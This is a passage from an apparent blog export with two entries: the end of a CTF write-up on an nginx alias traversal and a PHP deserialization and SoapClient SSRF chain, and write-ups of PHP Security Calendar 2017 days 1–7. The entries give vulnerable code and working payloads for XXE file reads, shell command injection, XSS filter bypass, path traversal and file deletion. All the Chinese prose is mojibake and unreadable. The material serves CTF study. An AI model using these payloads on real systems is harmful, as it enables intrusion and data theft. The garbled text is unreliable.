ÁªìÂêàÊèêÁ§∫‰∏≠ÁöÑÊ∫êÁ†ÅÊ≥ÑÈú≤ÔºåËøôÈáåÂ∞ùËØïnginxÁöÑaliasÈÖçÁΩÆ‰∏çÂΩìÂØºËá¥ÁõÆÂΩïÁ©øË∂äÊºèÊ¥û„ÄÇÊï¥‰∏™ËøáÁ®ãÂ∞±‰∏Ä‰∏™uploadsÁõÆÂΩï,ÊûÑÈÄ†payload:https://50.3.232.201:8000/uploads../ ÂæóÂà∞‰∏Ä‰∏™default.backup:123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; # Á¶ÅÊ≠¢Áõ¥Êé•ËÆøÈóÆ &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125;&#125; ËØ¥Êòé8080Á´ØÂè£ËøòÊúâÂè¶‰∏Ä‰∏™ÊúçÂä°ÔºåÂç≥Âú®/var/www/miniProxyÁõÆÂΩï‰∏ãÔºåÁõ¥Êé•ËÆøÈóÆhttps://50.3.232.201:8000/uploads../miniProxy/ÂèØ‰ª•Áõ¥Êé•‰∏ãËΩΩphpÊ∫êÁ†ÅÔºå‰∏ç‰ºöËß£ÊûêÔºåËøô‰∏™È°µÈù¢ÁöÑÂäüËÉΩÂ§ßÊ¶ÇÂ∞±ÊòØwebÁöÑproxy„ÄÇ Ê≠§Â§ñÔºåÈÄöËøáÁõÆÂΩïÁ©øË∂äÂèØ‰ª•‰∏ãËΩΩÂà∞ÂÖ®ÈÉ®phpÊ∫êÁ†Å„ÄÇ Ê∫êÁ†ÅÂü∫Êú¨ÊµèËßà‰∫Ü‰∏ÄÈÅçÔºåÂä†‰∏äÊèêÁ§∫ÔºåÊàë‰ª¨Ë¶ÅÊãøÂà∞Êï∞ÊçÆÂ∫ìÈáåÈù¢ÁöÑflagÔºåÂú®db.phpÁöÑ38Ë°åÂá∫‰∏≠Êúâ‰∏ÄÂ§ÑÂèçÂ∫èÂàóÂåñÊìç‰Ωúunserialize()ÔºöËÄåËØ•ÂáΩÊï∞ÁöÑÂäüËÉΩÊòØÂ∞Ü‰ªéÊï∞ÊçÆÂ∫ìÂèñÂá∫ÁöÑÊï∞ÊçÆËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºådb.phpÁöÑ52Ë°åÔºö ÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÊÉ≥ÊéßÂà∂Ëøô‰∏™unserialize()ÂáΩÊï∞ÔºåÂ∞±ÂæóÂÖàÂæÄÊï∞ÊçÆÂ∫ìÈáåÈù¢ÊèíÂÖ•Êàë‰ª¨ÁöÑÊï∞ÊçÆÔºå55Ë°å: ÂÖ®Â±ÄÊêúÁ¥¢insertÊìç‰ΩúÔºåÂÖ±‰∏§Â§ÑÔºå‰∏ÄÂ§ÑÊ≥®ÂÜåÔºå‰∏ÄÂ§ÑÊèê‰∫§postÊï∞ÊçÆ„ÄÇ post.phpÁöÑ41Ë°åÔºö ÂÖ®Â±ÄÊêúÁ¥¢save()ÂáΩÊï∞ÔºåÂú®default.phpÁöÑ19Ë°åÔºö save()ÂáΩÊï∞‰∏≠insert()ÔºåÂú®db.php‰∏≠ÁöÑ55Ë°å ÂÜçË∑üËøõDB::prepare_params()Ôºådb.phpÁöÑ18Ë°å: ËøôÈáå‰∏≠ÈÄîÂØπarray_map()Ê≤°ÁêÜËß£Â•ΩÔºåÂç°‰∫ÜÂæà‰πÖ:https://php.net/manual/en/function.array-map.php Âà∞ËøôÈáåÔºåÊàë‰ª¨Ë¶Å‰º†ÂÖ•‰∏Ä‰∏™$serializedobject$ÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊâçËÉΩ‰ΩøÂæóÊü•Â∫ìÊìç‰ΩúÊó∂Ëß¶ÂèëÊàë‰ª¨ÁöÑunserialize()Ôºå‰ΩÜinsertÁöÑÊó∂ÂÄôËøáÊª§‰∫ÜËøô‰∏™Â≠óÁ¨¶‰∏≤ÂâçÁºÄÔºåÂú®ÂÆòÊñπÁöÑwp‰∏≠ÊèêÂà∞ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂÖ®ËßíÁ¨¶Âè∑ÁöÑunicodeÂ≠óÁ¨¶Ôºåmssql‰ºöËá™Âä®ËΩ¨Êç¢Ôºå‰ª•$Á¨¶Âè∑Â≠òÂÖ•Êï∞ÊçÆÂ∫ì‰∏≠„ÄÇ ËøôÈáå0xEF 0xBC 0x84‰ºöË¢´mssqlÂ≠òÂÇ®‰∏∫$ ‰∏ãÈù¢ÊûÑÈÄ†ÂèçÂ∫èÂàóÂåñÁöÑÊîªÂáªÈìæÔºöÈ¶ñÂÖàdefault.php 73Ë°åË∞ÉÁî®‰∫Üpost.phpÁöÑ63Ë°å,‰ΩøÁî®‰∫ÜqueryÂáΩÊï∞Êü•ËØ¢ ÂêåÊó∂Âú®post.php‰∏≠ÁöÑAttachmentÁ±ª ÊéßÂà∂$zaÂ±ûÊÄß‰º†ÂÖ•soapClientÁ±ªÔºå‰Ωø‰πãÂú®‰∏äÂõæ19Ë°åË∞ÉÁî®‰∫Üopen()ÊñπÊ≥ïÔºåÂõ†‰∏∫‰∏çÂ≠òÂú®ÔºåÊâÄ‰ª•Ëß¶ÂèësoapClientÁöÑ__callÊñπÊ≥ï(ËøôÈáåÁåúÊÉ≥ÊúâsoapÊúçÂä°ÔºåÂè¶‰∏Ä‰∏™8080Á´ØÂè£ÁöÑÊúçÂä°ÊöóÁ§∫Êàë‰ª¨‰∫ÜssrfÔºåÂä†‰∏äËøôÈáåunserializeÁöÑÂà©Áî®ÂäüËÉΩÁÇπÂ∞ë) payload: $Áî®brupÁöÑhex‰øÆÊîπ 8080Á´ØÂè£ÊúçÂä°Âè™ÂÖÅËÆ∏getÂûãÊï∞ÊçÆÔºå‰ΩÜÊòØ‰ªéÂÖ∂ÊúçÂä°‰∏≠Êù•ÁúãÊàë‰ª¨Ë¶ÅÁî®postÂûãÂéªÊâìÂÜÖÁΩëÊï∞ÊçÆÂ∫ìÔºåÊâÄ‰ª•ËøôÈáåÂ∞±Âà©Áî®soapclientÁöÑclrfÂèëËµ∑getËØ∑Ê±ÇÔºågopherÊ®°Êãüpost]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP SECURITY CALENDAR 2017]]></title>
    <url>%2F2019%2F02%2F14%2FPHP%20SECURITY%20CALENDAR%202017%2F</url>
    <content type="text"><![CDATA[Day 1 - Wish ListËÄÉÁÇπÔºöin_array()Êú™ÈÖçÁΩÆÁ¨¨‰∏â‰∏™ÂèÇÊï∞ÔºåÂØºËá¥Âº±Á±ªÂûãÁªïËøáÈ¢òÁõÆÊ∫êÁ†ÅÔºö123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &apos;./solutions/&apos;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&apos;tmp_name&apos;], self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&apos;solution&apos;]); Â§ßËá¥ÁöÑÈÄªËæë‰∏∫‰∏ä‰º†‰∏Ä‰∏™Ë°®Âçïname=solutionÁöÑÊñá‰ª∂ÔºåÈ™åËØÅÂÖ∂Êñá‰ª∂ÂêçÂú®range(1,24)ÁöÑËåÉÂõ¥Ôºå‰ΩøÁî®ÁöÑin_array()Êù•ËøõË°åÈ™åËØÅ„ÄÇ ÈóÆÈ¢òÂ∞±Âá∫Âú®in_array()ÂáΩÊï∞Ôºöhttps://php.net/manual/zh/function.in-array.php ÊñáÊ°£‰∏≠ÂÜôÈÅìÔºåÂ¶ÇÊûúÊ≤°Êúâ‰ΩøÁî®Á¨¨‰∏â‰∏™ÂèÇÊï∞$strick=trueÔºåÂàô‰ΩøÁî®Âº±Á±ªÂûãÊØîËæÉÔºåÂç≥ÂâçÂÖàËøõË°åÁ±ªÂûãËΩ¨Êç¢ÂÜçÊØîËæÉ„ÄÇÂç≥Êàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™Êñá‰ª∂Âêç‰∏∫1a.php,ÁªèËøáin_array()ÁöÑÁ±ªÂûãËΩ¨Êç¢‰ºöÂèòÊàê1‰ªéËÄåÁªïËøáËøô‰∏™ÈôêÂà∂„ÄÇ demo:123456&lt;?php$array = range(1,24);$file_name = &quot;1a.php&quot;;if(in_array($file_name, $array))&#123; var_dump(in_array($file_name, $array));&#125; Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑ‰∏ÄÈÅìÁªÉ‰π†È¢òÔºöhttps://xz.aliyun.com/t/2451ËøôÈáåÁî®make_setÂáΩÊï∞ÁªïgroupÔºåÁÑ∂ÂêéÊä•ÈîôÊ≥®ÂÖ•„ÄÇ Ê≤°ËøáÊª§sleepÔºåifÔºåmidÁõ≤Ê≥®‰πüË°å Day 2 - TwigËÄÉÁÇπÔºöfilter_varÁöÑurlÈ™åËØÅÁªïËøáÈ¢òÁõÆÊ∫êÁ†ÅÔºö123456789101112131415161718192021222324252627282930313233// composer require &quot;twig/twig&quot;require &apos;vendor/autoload.php&apos;;class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = &apos;&lt;img &apos; . &apos;src=&quot;https://loremflickr.com/320/240&quot;&gt;&apos; . &apos;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&apos;; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\Loader\ArrayLoader([ &apos;index.html&apos; =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET[&apos;nextSlide&apos;]; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( &apos;index.html&apos;, [&apos;link&apos; =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); ‰∏§‰∏™ËøáÊª§ÁÇπÔºå‰∏Ä‰∏™ÊòØtwigÊ®°ÊùøÂºïÊìéËá™Â∏¶ÁöÑescapeËøáÊª§Ôºöhttps://twig.symfony.com/ ‰πüÂ∞±ÊòØhtmlspecialcharsÂÆûÁé∞ÁöÑËøáÊª§„ÄÇ12345&amp; (&amp; Á¨¶Âè∑) =============== &amp;amp;&quot; (ÂèåÂºïÂè∑) =============== &amp;quot;&apos; (ÂçïÂºïÂè∑) =============== &amp;apos;&lt; (Â∞è‰∫éÂè∑) =============== &amp;lt;&gt; (Â§ß‰∫éÂè∑) =============== &amp;gt; Á¨¨‰∫å‰∏™ÁÇπÔºöfilter_var($nextSlide, FILTER_VALIDATE_URL)ÔºåÊ£ÄÊµãÊòØÂê¶‰∏∫‰∏Ä‰∏™ÂêàÊ≥ïÁöÑurl„ÄÇ ËøôÈáåÁªôÂá∫ÁöÑpayloadÔºö?url=javascript://commentÔºÖ250aalert(1)Âç≥%25-&gt;%,%0a-&gt;Êç¢Ë°åÁ¨¶Ôºå‰∫åÊ¨°urlÁºñÁ†ÅÔºåÁ¨¨‰∏ÄÊ¨°‰∏∫‰º†ÂÖ•Êó∂ÊµèËßàÂô®Êé•Á†Å‰∏ÄÊ¨°ÔºåÁ¨¨‰∫åÊ¨°‰∏∫Ëß£ÊûêÊó∂ÔºåÊµèËßàÂô®Ëß£Á†ÅÊç¢Ë°åÁ¨¶„ÄÇÊâÄ‰ª•JavaScript‰º™ÂçèËÆÆÂíåÊç¢Ë°åÁªïËøá‰∫ÜËøô‰∏™ÈôêÂà∂„ÄÇ Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑ‰∏Ä‰∏™ÁªÉ‰π†È¢òÔºöhttps://xz.aliyun.com/t/2491ÊòæÁÑ∂ËøôÈáå‰∏çÊòØËÄÉÂØüorangeÁöÑparse_urlÂáΩÊï∞ÂíåcurlÂ§ÑÁêÜhostÁöÑÂ∑ÆÂºÇÔºåËøôÈáåË¶ÅÊ±ÇÊàë‰ª¨parse_urlÂ§ÑÁêÜÂêéÁöÑhost‰ª•ËßÑÂÆöÁöÑÂüüÂêçÁªìÂ∞æÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØÊéßÁöÑÂ∞±ÊòØÂâçÈù¢Ôºå ËøôÈáåÊµãËØïÁöÑphpÁâàÊú¨‰∏∫5.5Ôºö ÁÆÄÂçïÊµãËØï‰∫Ü‰∏Ä‰∏ãfilter_varÁöÑurlÂêàÊ≥ïÊ£ÄÊµãÊÉÖÂÜµ(ÁàÜÁ†¥ÁöÑÊó∂ÂÄôËÆ∞ÂæóÂ∞ÜbrupÁöÑËá™Âä®urlÁºñÁ†ÅÂÖ≥Êéâ) ÂÖ∂ÂÆûËøôÈáåÊºè‰∫Ü‰∏Ä‰∏™%23ÔºåÊ≤°Êúâ#ÈîöÁÇπÁöÑÁâπÊÆäÂäüËÉΩÔºåÂçïÁ∫ØÂè™ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶#url=https://demo.com%23sec-redclub.com ËøòÊúâÊç¢ÊàêÂà´ÁöÑÂçèËÆÆËøòËÉΩÁî®ÂàÜÂè∑ÁªïËøá,Ëøô‰∏ÄÊ≠•Âú®ÂëΩ‰ª§ÊâßË°åÈáåÈù¢ÂæàÂÖ≥ÈîÆÔºö?url=demo://demo.com;sec-redclub.com ÂÜçÊù•ÁúãÁúãÁùÄÂ¶Ç‰ΩïÁªïËøáÁ¨¨‰∫åÊ≠•parse_url($url)[&#39;host&#39;]ÁöÑÊ≠£ÂàôÂåπÈÖçÔºöurl=demo://demo.com;ls;sec-redclub.com Ëøõ‰∏ÄÊ≠•ÊûÑÈÄ†Ôºö payload:?url=demo://aa&quot;;ls;&quot;sec-redclub.com ËØªflagÔºö?url=demo://aa&quot;;cat${IFS}f1agi3hEre.php;&quot;sec-redclub.com Day 3 - Snow FlakeÈ¢òÁõÆÊ∫êÁ†ÅÔºö12345678910111213141516171819202122232425262728293031function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&apos;c&apos;];$data = $_GET[&apos;d&apos;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data[&apos;t&apos;], $data[&apos;v&apos;]); $controller-&gt;render();&#125; else &#123; echo &apos;There is no page with this name&apos;;&#125;class HomeController &#123; private $template; private $variables; public function __construct($template, $variables) &#123; $this-&gt;template = $template; $this-&gt;variables = $variables; &#125; public function render() &#123; if ($this-&gt;variables[&apos;new&apos;]) &#123; echo &apos;controller rendering new response&apos;; &#125; else &#123; echo &apos;controller rendering old response&apos;; &#125; &#125;&#125; ÂàùÁúãÊ∫êÁ†ÅÂÖ∂ÂÆûÂπ∂‰∏çÁü•ÈÅìÂì™ÊúâÊºèÊ¥ûÔºåÂèØÊéßÁöÑÁÇπÊìç‰ΩúÁöÑ‰∏úË•øÂ∞èÂæàÂ∞ëÔºåËÄå‰∏î‰πüÊ≤°ÊúâËæìÂá∫ÁöÑÂú∞Êñπ„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊñáÊ°£‰∏≠ÂÜôÂà∞class_exists()ÁöÑÁî®Ê≥ïÔºöhttps://php.net/manual/zh/function.class-exists.php ÈªòËÆ§ÊòØÁ±ª‰∏çÂ≠òÂú®Êó∂Ë∞ÉÁî®__autoload()ÂáΩÊï∞ÁöÑ ÊñáÊ°£‰∏≠ÂÜôÂà∞Ôºå__autoload()Âú®php7.2Â∑≤ÁªèÂ∫üÂºÉÔºåÂèñËÄå‰ª£‰πãÁöÑÊòØspl_autoload_register() ËøòÊúâ‰∏Ä‰∫õ‰ºöËá™Âä®Ë∞ÉÁî®__autoload()ÂáΩÊï∞ÁöÑÂáΩÊï∞1234567891011121314151617call_user_func()call_user_func_array()class_exists()class_implements()class_parents()class_uses()get_class_methods()get_class_vars()get_parent_class()interface_exists()is_a()is_callable()is_subclass_of()method_exists()property_exists()spl_autoload_call()trait_exists() ÁÑ∂ËÄåÁöÑÊòØPHP5~5.3ÊâçËÉΩÁî®.Á¨¶Âè∑ÔºåÂú®php5.4‰øÆÂ§ç‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåÊâÄ‰ª•Êó¢‰∏çËÉΩÁõÆÂΩïÁ©øË∂äÔºå‰πü‰∏çËÉΩ ÂåÖÂê´ÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑ.phpÁ≠âÊñá‰ª∂„ÄÇ Á¨¨‰∫å‰∏™ÊºèÊ¥û‰∫ßÁîüÁöÑÂéüÂõ†Â∞±ÊòØÂõ†‰∏∫Á±ªÂêçÂíåÂÖ∂ÂÆû‰æãÂåñ‰º†ÂÖ•ÁöÑÂèÇÊï∞ÂèØÊéßÔºåÂØºËá¥Êàë‰ª¨ÂèØ‰ª•ÊéßÂà∂phpÂÜÖÈÉ®Â≠òÂú®ÊºèÊ¥ûÁöÑÁ±ª„ÄÇ exp demo:12345678910111213141516&lt;?php# ËÆ©phpÂÖÅËÆ∏Â§ñÈÉ®ÂÆû‰Ωìlibxml_disable_entity_loader(false);$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT | LIBXML_DTDLOAD);var_dump($xml_class);// LIBXML_NOENT: Â∞ÜxmlÂÆû‰ΩìÂºïÁî®ÊõøÊç¢ÊàêÂØπÂ∫îÁöÑÂÄº// LIBXML_DTDLOAD: Âä†ËΩΩDOCTYPE‰∏≠ÁöÑDTDÊñá‰ª∂ payload:1/?c=SimpleXMLElement&amp;d[v]=2&amp;d[t]=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; Êå∫ÁñëÊÉëSimpleXMLElementÁ¨¨‰∫å‰∏™ÂèÇÊï∞Áªô2ÁöÑÂéüÂõ†.. ÊääÁªìÊûúËæìÂá∫Âá∫Êù•‰∫ÜÔºåËøôÈáåÂæóÁõ≤Êâìxxe,ËøôÈáåÊåñ‰∏™ÂùëÔºå‰ª•ÂêéÂÜçÂ°´„ÄÇ ‰∏ãÈù¢Êù•Áúã‰∏Ä‰∏ãÁ∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑÂÆ°ËÆ°È¢òÔºöindex.php12345678910111213141516171819202122&lt;?phpclass NotFound&#123; function __construct() &#123; die(&apos;404&apos;); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET[&apos;name&apos;]) ? $_GET[&apos;name&apos;] : null;$param = isset($_GET[&apos;param&apos;]) ? $_GET[&apos;param&apos;] : null;$param2 = isset($_GET[&apos;param2&apos;]) ? $_GET[&apos;param2&apos;] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&apos;=&gt;&apos;.$value.&apos;&lt;br&gt;&apos;;&#125; ËøôÈáå‰ΩøÁî®ÁöÑÊòØspl_autoload_register()ÂáΩÊï∞ÔºåÁÆÄËÄåË®Ä‰πãÊòØ__autoload()ÁöÑÂçáÁ∫ßÁâàÔºåÁªôautoloadÂàõÂª∫‰∏Ä‰∏™ÈòüÂàóÔºåÈÄê‰∏™ÊâßË°å„ÄÇÂèÇÊï∞Â¶Ç‰∏ãÔºö Ëß£È¢òÊÄùË∑ØÔºöÂÖà‰ΩøÁî®ÂÜÖÁΩÆÁ±ª:GlobIterator,ÂÖ∂ÊûÑÈÄ†ÂáΩÊï∞Áî®Ê≥ïÔºöËøôÊ†∑Â∞±ÂèØ‰ª•ÊêúÁ¥¢Êñá‰ª∂‰ΩçÁΩÆÔºö Êâæflag‰ΩçÁΩÆÔºöname=GlobIterator&amp;param=*.php&amp;param2=0 ËøôÈáåËØªÂèñflagË¶Å‰ΩøÁî®phpÊñá‰ª∂ÊµÅÁöÑÂéüÂõ†ÊòØÂõ†‰∏∫xxeËØªÂèñÁöÑÊñá‰ª∂‰∏≠Â¶ÇÊûúÂ≠òÂú®&lt;&gt;&#39;&quot;&amp;Â∞±‰ºöÂØºËá¥xmlÊñá‰ª∂Ëß£ÊûêÈîôËØØÔºåÊâÄ‰ª•Â∞±Âè™ËÉΩËøôÊ†∑ÈÄöËøáÊµÅÁöÑÊñπÂºèbase64ÁºñÁ†ÅËØªÂá∫„ÄÇ ËØªflagÔºö1name=SimpleXMLElement&amp;param2=2&amp;param=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; Day 4 - False Beard123456789101112131415161718192021class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp; (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;)) ) &#123; $format = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&apos; . &apos;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&apos;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]); ÂéªÁøª‰∏Ä‰∏ãstrposÁöÑÊñáÊ°£ÔºåÈáåÈù¢‰πüÊòéÁ°ÆËØ¥Êòé‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåËØ•ÂáΩÊï∞ËøîÂõûÊü•ËØ¢Â≠óÁ¨¶È¶ñÊ¨°Âá∫Áé∞ÁöÑÊï∞Â≠ó‰ΩçÁΩÆÔºåÂ¶ÇÊûúÂú®Á¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰ΩçÁΩÆÂàôËøîÂõû0ÔºåÂ¶ÇÊûú‰ΩøÁî®Âº±Á±ªÂûãÊØîËæÉÔºåÂàôÂèØËÉΩÂØºËá¥ÂÆâÂÖ®ÊºèÊ¥û„ÄÇ Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑÁªÉ‰π†È¢òÔºåÂú®api.phpÂ∞ÜÁî®Êà∑ÁöÑÊØè‰∏Ä‰ΩçÊï∞Â≠óÂíåÂºÄÂ•ñÁöÑÊï∞Â≠óËøõË°åÊØîËæÉÔºåÁõ∏Âêå‰ΩçÊï∞Ë∂äÂ§öÂàôÂæóÂà∞ÁöÑÂ•ñÈáëË∂äÂ§ö„ÄÇ ‰ΩøÁî®ÁöÑÂº±Á±ªÂûãÊØîËæÉÔºåÂ¶ÇÊûú‰ªéÂ∏ÉÂ∞îÂûãÁöÑËßíÂ∫¶ÊÉ≥Êù•ÔºåÈô§‰∫Ü0,false,nullÂÖ∂‰ªñÈÉΩ‰∏∫ÁúüÔºåÂàôÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™Êï∞ÁªÑ‰ΩøÂÖ∂ÈÉΩ‰∏∫ÁúüÂç≥ÂèØÔºö Day 5 - postcard12345678910111213141516171819202122232425262728293031323334353637class Mailer &#123; private function sanitize($email) &#123; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; return &apos;&apos;; &#125; return escapeshellarg($email); &#125; public function send($data) &#123; if (!isset($data[&apos;to&apos;])) &#123; $data[&apos;to&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;to&apos;] = $this-&gt;sanitize($data[&apos;to&apos;]); &#125; if (!isset($data[&apos;from&apos;])) &#123; $data[&apos;from&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;from&apos;] = $this-&gt;sanitize($data[&apos;from&apos;]); &#125; if (!isset($data[&apos;subject&apos;])) &#123; $data[&apos;subject&apos;] = &apos;No Subject&apos;; &#125; if (!isset($data[&apos;message&apos;])) &#123; $data[&apos;message&apos;] = &apos;&apos;; &#125; mail($data[&apos;to&apos;], $data[&apos;subject&apos;], $data[&apos;message&apos;], &apos;&apos;, &quot;-f&quot; . $data[&apos;from&apos;]); &#125;&#125;$mailer = new Mailer();$mailer-&gt;send($_POST); Day6 - Forst Pattern123456789101112131415161718192021222324252627class TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case &apos;create&apos;: $this-&gt;createToken($data); break; case &apos;delete&apos;: $this-&gt;clearToken($data); break; default: throw new Exception(&apos;Unknown action&apos;); &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents(&apos;/tmp/tokens/&apos; . $token, &apos;...data&apos;); &#125; public function clearToken($token) &#123; $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token); unlink(&apos;/tmp/tokens/&apos; . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET[&apos;action&apos;], $_GET[&apos;data&apos;]); ÂÖ≥ÈîÆÁÇπÂú®preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);Â∞ÜÈùû‰ªéa-z,.-_ÊõøÊç¢‰∏∫Á©∫ÔºåËøáÊª§‰∏ç‰∏•ÔºåÂØºËá¥ÂèØ‰ª•‰ΩøÁî®../../ÂØºËá¥‰ªªÊÑèÊñá‰ª∂Âà†Èô§„ÄÇ Á∫¢Êó•ÁöÑÁªÉ‰π†È¢òwpÔºö1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude &apos;flag.php&apos;;if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])&#123; $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) // [[:graph:]] ÔºöÂåπÈÖçÊâÄÊúâÁöÑÂèØÊâìÂç∞Â≠óÁ¨¶ÔºåÁ≠â‰ª∑‰∫é[^ \t\n\r\f\v] &#123; echo &apos;Wrong Format&apos;; exit; &#125; while (TRUE) &#123; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; // Â∞èÂÜô Â§ßÂÜô Ê†áÁÇπ Êï∞Â≠ó if (6 &gt; preg_match_all($reg, $password, $arr))&#123; echo &quot;step2:&quot;.preg_match_all($reg, $password, $arr); break; &#125; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3)&#123; echo &quot;step3:&quot;.$c; break; &#125; if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; &#125;&#125;highlight_file(__FILE__);?&gt; ‰ΩøÁî®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÁªïÔºöpayloadÔºö12password=42.00e%2b00000000000 password=420.000000e-1 Âä†Âè∑Ê≥®ÊÑèË¶ÅurlÁºñÁ†ÅÔºå‰∏çÁÑ∂ÊòØÁ©∫ÁôΩÂ≠óÁ¨¶ÔºåÂú®burpÁöÑparams‰∏≠ÂèØ‰ª•ÁúãÂà∞‰∏çÁºñÁ†ÅÁöÑÂèÇÊï∞Ôºö Day 7 - BellËÄÉÂØüÁöÑparse_strÊ≤°ÊúâÈÖçÁΩÆÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÂØºËá¥ÂèòÈáèË¶ÜÁõñ„ÄÇ123456789101112131415161718192021222324&lt;?phpfunction getUser($id) &#123;global $config, $db;if (!is_resource($db)) &#123; $db = new MySQLi( $config[&apos;dbhost&apos;], $config[&apos;dbuser&apos;], $config[&apos;dbpass&apos;], $config[&apos;dbname&apos;] );&#125;$sql = &quot;SELECT username FROM users WHERE id = ?&quot;;$stmt = $db-&gt;prepare($sql);$stmt-&gt;bind_param(&apos;i&apos;, $id);$stmt-&gt;bind_result($name);$stmt-&gt;execute();$stmt-&gt;fetch();return $name;&#125;$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);parse_str($var[&apos;query&apos;]);$currentUser = getUser($id);echo &apos;&lt;h1&gt;&apos;.htmlspecialchars($currentUser).&apos;&lt;/h1&gt;&apos;; 